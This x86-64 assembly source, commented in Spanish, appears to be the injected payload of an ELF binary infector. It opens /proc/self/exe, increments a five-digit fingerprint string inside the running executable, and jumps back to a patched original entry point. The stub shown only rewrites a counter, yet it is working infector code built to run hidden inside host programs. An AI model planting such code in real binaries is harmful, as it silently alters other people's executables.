section .text
global _ft_payload

_ft_payload:
    xor     rax, rax

    ; push    rbp                                  Guardo en el stack en valor de EBP (cpu): [esp + 0x00] y ESP se desplaza 4 bytes hacia abajo.
    ; mov     rbp, rsp
    ; and     rsp, 0xfffffffffffffff0              Alinear a 16 bytes
    ; sub     rsp, 0x20                            Reservo 32 bytes (0x20) de espacio en el stack para las varibles locales y los argumentos.

    push    rax                                 ; Guardo el entorno (los registros en el stack) - El binario original espera encontrarse los registros como estaban.
    push    rbx                                 ; Guardo rbx (lo uso para call/pop).
    push    rdi                 
    push    rsi
    push    rdx
    push    r12
    push    r13

    call    .next
.next:
    pop     rbx                                 ; rbx = dirección base del payload (y el rbx original está a salvo en el stack)


    lea     rdi, [rel path]                     ; cargo puntero al string "/proc/self/exe".
    mov     rax, 2                              ; syscall (2) para open
    mov     rsi, 2                              ; flags (O_RDWR = 2).
    xor     rdx, rdx                            ; 0 (mode)
    syscall
    mov     r12, rax                            ; guardo fd en r12

    ; ... LSEEK: ir al offset del FINGERPRINT ...
    mov     rax, 8                              ; syscall number: lseek
    mov     rdi, r12
    mov     rsi, [rel offset_fingerprint]
    xor     rdx, rdx                            ; SEEK_SET = 0
    syscall

    ; ... READ: leer los 5 bytes del FINGERPRINT ...
    mov     rax, 0                              ; syscall number: read
    mov     rdi, r12                            ; fd (guardado en r12)
    lea     rsi, [rel buffer]                   ; puntero al buffer en .data
    mov     rdx, 5                              ; leer 5 bytes (los dígitos)
    syscall
    cmp     rax, 0x5
    jne     .restore

    ; --- CONVERSIÓN: string "39XXX" a número en r13 ---
    xor     r13, r13                        ; r13 = 0 (acumulador)

    movzx   eax, byte [rel buffer]          ; eax = '3'
    sub     eax, '0'                        ; eax = 3
    add     r13, rax                        ; r13 = 3

    movzx   eax, byte [rel buffer + 1]      ; eax = '9'
    sub     eax, '0'                        ; eax = 9
    imul    r13, r13, 10                    ; r13 = 30
    add     r13, rax                        ; r13 = 39

    movzx   eax, byte [rel buffer + 2]      ; eax = '7'
    sub     eax, '0'                        ; eax = 7
    imul    r13, r13, 10                    ; r13 = 390
    add     r13, rax                        ; r13 = 397

    movzx   eax, byte [rel buffer + 3]      ; eax = '7'
    sub     eax, '0'                        ; eax = 7
    imul    r13, r13, 10                    ; r13 = 3970
    add     r13, rax                        ; r13 = 3977

    movzx   eax, byte [rel buffer + 4]      ; eax = '4'
    sub     eax, '0'                        ; eax = 4
    imul    r13, r13, 10                    ; r13 = 39770
    add     r13, rax                        ; r13 = 39774

    ; --- INCREMENTAR ---
    inc     r13                             ; r13 = 39775

    ; ... CONVERSIÓN: número en r13 (39XXX) a string en buffer ...
    mov     rax, r13                            ; rax = 39775 o el que toque
    lea     rdi, [rel buffer]
    add     rdi, 4                              ; puntero al último bytes
    mov     rcx, 5                              ; contador de 5 dígitos

.conv_loop:
    xor     rdx, rdx                            ; rdx = 0 (parte alta del dividendo)
    mov     r8, 10                              ; divisor en r8
    div     r8                                  ; rax = rax / 10, rdx = rax % 10
    add     dl, '0'                             ; convertir a ASCII
    mov     [rdi], dl                           ; guardar el dígito
    dec     rdi                                 ; mover el puntero hacia atrás
    loop    .conv_loop

    ; ... LSEEK de nuevo al offset ...
    mov     rax, 8
    mov     rdi, r12
    mov     rsi, [rel offset_fingerprint]
    xor     rdx, rdx
    syscall

    ; ... WRITE del nuevo string ...
    mov     rax, 1                              ; syscall number: write
    mov     rdi, r12                            ; fd
    lea     rsi, [rel buffer]                   ; puntero al nuevo string
    mov     rdx, 5                              ; escribir 5 bytes
    syscall

    ; ... CLOSE ...
    mov     rax, 3                              ; syscall number: CLOSE
    mov     rdi, r12
    syscall
    jmp     .restore

.restore:
    pop     r13
    pop     r12
    pop     rdx
    pop     rsi
    pop     rdi
    pop     rbx
    pop     rax

    ; mov     rsp, rbp
    ; pop     rbp
    jmp     qword [rel ret_addr]

path: db "/proc/self/exe", 0
offset_fingerprint: dq 0xDEADBEEF               ; Marcador para el offset
buffer: times 8 db 0                            ; Buffer de 8 bytes, inicializado a 0
ret_addr: dq 0xCAFEBABE                         ; Marcador para la dirección de retorno